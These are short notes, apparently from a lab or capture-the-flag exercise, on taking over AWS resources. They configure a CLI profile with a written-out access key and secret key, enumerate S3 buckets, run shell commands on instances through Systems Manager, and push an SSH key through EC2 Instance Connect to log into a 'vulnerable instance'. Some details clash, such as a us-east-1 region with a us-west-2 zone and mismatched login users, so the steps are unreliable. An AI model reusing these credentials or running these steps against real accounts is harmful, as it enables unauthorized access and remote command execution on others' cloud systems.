# Gaining access to Instance
```
aws configure --profile Test
AWS Access Key ID [None]: AKIAIRYBX5NHQLRB52WQ
AWS Secret Access Key [None]: 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
Default region name [None]: us-west-2
```
# Upon adding the crednetail.next step is to enumerate
```

aws s3 ls --profile Test
aws s3 ls s3://file.resilient --profile Test
```

# If you have enough to have priviledge to utilize AWS Systems Manager Agent 
```
aws ssm describe-instance-information — profile Test

aws ssm send-command --instance-ids "INSTANCE-ID-HERE" --document-name "AWS-RunShellScript" --comment "IP Config" --parameters commands=ifconfig --output text --query "Command.CommandId" --profile Test
```
# Gaining access to vulerable Instance
```
apt-get isntall install ec2-instance-connect
aws ec2-instance-connect send-ssh-public-key --region us-east-1 --instance-id i-0989ec8719613a4d9 --availability-zone us-west-2f --instance-os-user ec2-user --ssh-public-key file://My-Key.pub
ssh -i private.key ubuntu@54.211.12.132
```
